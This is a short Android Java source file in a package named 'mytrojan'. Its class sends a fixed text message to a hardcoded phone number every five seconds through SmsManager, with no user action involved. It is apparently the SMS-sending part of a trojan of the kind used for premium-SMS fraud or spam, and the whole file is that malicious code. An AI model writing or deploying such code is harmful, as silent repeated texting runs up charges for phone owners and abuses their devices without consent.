
package com.example.mytrojan;

import android.os.Handler;
import android.telephony.SmsManager;
import android.util.Log;

public class SendSMSPeriodically {
    private final static int INTERVAL = 1000 * 1 * 5; // 5 seconds
    Handler mHandler = new Handler();

    Runnable mHandlerTask = new Runnable()
    {
        @Override
        public void run() {
            sendSMS();
            mHandler.postDelayed(mHandlerTask, INTERVAL);
        }
    };

    void startRepeatingTask()
    {
        mHandlerTask.run();
    }

    void stopRepeatingTask()
    {
        mHandler.removeCallbacks(mHandlerTask);
    }

    void sendSMS() {

        String messageToSend = "this is a message";
        String number = "2121234567";

        SmsManager.getDefault().sendTextMessage(number, null, messageToSend, null,null);
    }

}
